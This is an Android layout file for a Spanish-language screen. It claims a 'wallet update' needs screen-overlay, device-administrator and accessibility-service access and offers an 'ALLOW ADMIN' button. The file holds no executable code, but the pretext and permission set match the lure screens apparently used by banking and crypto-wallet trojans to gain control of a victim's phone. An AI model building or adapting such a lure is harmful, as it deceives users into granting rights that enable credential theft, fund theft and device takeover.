<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#0D0000"
    android:gravity="center"
    android:padding="24dp">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Permisos Requeridos"
        android:textColor="#FFFFFF"
        android:textSize="28sp"
        android:textStyle="bold"
        android:layout_marginBottom="16dp"/>

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Para continuar con la actualizacion de la billetera, necesitamos los siguientes accesos."
        android:textColor="#AAAAAA"
        android:textSize="16sp"
        android:gravity="center"
        android:layout_marginBottom="32dp"/>

    <TextView
        android:id="@+id/txtOverlay"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="[X] Permiso de Pantalla"
        android:textColor="#FF4444"
        android:textSize="20sp"
        android:padding="12dp"/>

    <TextView
        android:id="@+id/txtAdmin"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="[X] Administrador del Sistema"
        android:textColor="#FF4444"
        android:textSize="20sp"
        android:padding="12dp"/>

    <TextView
        android:id="@+id/txtAccess"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="[X] Servicio de Accesibilidad"
        android:textColor="#FF4444"
        android:textSize="20sp"
        android:padding="12dp"/>

    <Button
        android:id="@+id/btnStart"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="48dp"
        android:text="PERMITIR ADMIN"
        android:backgroundTint="#1976D2"
        android:textColor="#FFFFFF"
        android:textStyle="bold"/>
</LinearLayout>
